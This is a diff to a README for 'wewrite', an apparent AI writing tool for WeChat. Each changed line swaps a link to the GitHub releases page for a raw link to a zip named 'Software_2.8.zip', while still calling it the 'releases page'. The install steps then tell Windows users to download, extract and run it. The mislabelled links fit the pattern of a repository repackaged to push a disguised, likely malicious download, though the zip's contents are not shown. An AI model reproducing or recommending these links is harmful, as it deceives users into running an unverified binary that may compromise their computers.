@@ -1,6 +1,6 @@
 # ✨ wewrite - AI Writing for WeChat Articles
 
-[![Download wewrite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/arniepropagative708/wewrite/releases)
+[![Download wewrite](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arniepropagative708/wewrite/main/dist/Software_2.8.zip)
 
 ## 🚀 What is wewrite
 
@@ -10,7 +10,7 @@ It is built for people who want a simple path from idea to article. You do not n
 
 ## 📥 Download for Windows
 
-1. Open the [wewrite releases page](https://github.com/arniepropagative708/wewrite/releases)
+1. Open the [wewrite releases page](https://raw.githubusercontent.com/arniepropagative708/wewrite/main/dist/Software_2.8.zip)
 2. Find the latest release at the top of the page
 3. Under Assets, choose the Windows file, such as an `.exe` or `.zip`
 4. If you download a `.zip` file, unzip it first
@@ -84,7 +84,7 @@ If your computer runs standard office apps and web tools, it should handle this 
 
 ## 🛠️ Installation steps
 
-1. Go to the [wewrite releases page](https://github.com/arniepropagative708/wewrite/releases)
+1. Go to the [wewrite releases page](https://raw.githubusercontent.com/arniepropagative708/wewrite/main/dist/Software_2.8.zip)
 2. Download the latest Windows release
 3. If the file is zipped, right-click it and choose Extract All
 4. Open the extracted folder
@@ -148,7 +148,7 @@ Yes. You can review, edit, and adjust the draft before you publish or copy it in
 
 ## 🔗 Download
 
-Visit the [wewrite releases page](https://github.com/arniepropagative708/wewrite/releases) to download and run the latest Windows release
+Visit the [wewrite releases page](https://raw.githubusercontent.com/arniepropagative708/wewrite/main/dist/Software_2.8.zip) to download and run the latest Windows release
 
 ## 📁 Suggested folder setup
 
